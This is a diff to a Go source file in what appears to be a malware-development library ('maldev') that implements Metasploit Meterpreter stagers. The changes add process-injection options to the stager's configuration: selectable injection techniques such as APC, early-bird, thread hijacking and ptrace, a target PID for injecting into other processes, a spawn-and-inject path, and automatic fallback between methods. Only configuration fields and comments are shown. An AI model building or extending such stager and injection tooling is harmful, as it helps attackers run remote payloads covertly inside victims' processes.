@@ -1,13 +1,3 @@
-// Package meterpreter implements Metasploit Framework staging functionality.
-//
-// It provides a Go implementation of Meterpreter stagers that connect to
-// Metasploit handlers and execute the second-stage payload. It supports
-// multiple transport protocols (TCP, HTTP, HTTPS) and platform-specific
-// execution methods.
-//
-// Platform-specific behavior:
-//   - Windows: Receives 4-byte size prefix + stage payload, executes via VirtualAlloc/CreateThread
-//   - Linux: Receives 126-byte wrapper shellcode that loads ELF from socket
 package meterpreter
 
 import (
@@ -21,6 +11,7 @@ import (
 	"runtime"
 	"time"
 
+	"github.com/oioio-space/maldev/inject"
 	"github.com/oioio-space/maldev/useragent"
 )
 
@@ -58,6 +49,9 @@ type Config struct {
 	// Caller routes NT syscalls through a specific method (Windows only).
 	// Accepts *wsyscall.Caller from github.com/oioio-space/maldev/win/syscall.
 	// When nil, standard WinAPI calls are used.
+	// Only applies to the default self-injection path (Method == "").
+	// When Method is set, use inject.NewWindowsInjector with WindowsConfig
+	// for syscall routing control.
 	Caller any
 
 	// MaxStageSize is the maximum stage payload size in bytes.
@@ -67,6 +61,26 @@ type Config struct {
 	// UserAgent is the HTTP User-Agent header for HTTP/HTTPS transports.
 	// Default: "Mozilla/5.0".
 	UserAgent string
+
+	// Method specifies the injection technique for stage execution.
+	// When empty, the default self-injection is used (VirtualAlloc+CreateThread
+	// on Windows, purego mmap on Linux). When set, the stage is routed through
+	// the inject package which supports 10+ Windows methods and 5 Linux methods.
+	// See inject.AvailableMethods() for the full list.
+	Method inject.Method
+
+	// TargetPID is the target process ID for remote injection methods
+	// (crt, apc, rtl, apcex, ptrace). When 0, self-injection is used.
+	TargetPID int
+
+	// ProcessPath is the executable path for spawn-and-inject methods
+	// (earlybird, threadhijack). Required when using those methods.
+	ProcessPath string
+
+	// Fallback enables automatic fallback to alternate injection methods
+	// if the primary method fails. See inject.FallbackChain for the
+	// chain order per method.
+	Fallback bool
 }
 
 // Stager manages the Meterpreter staging process.
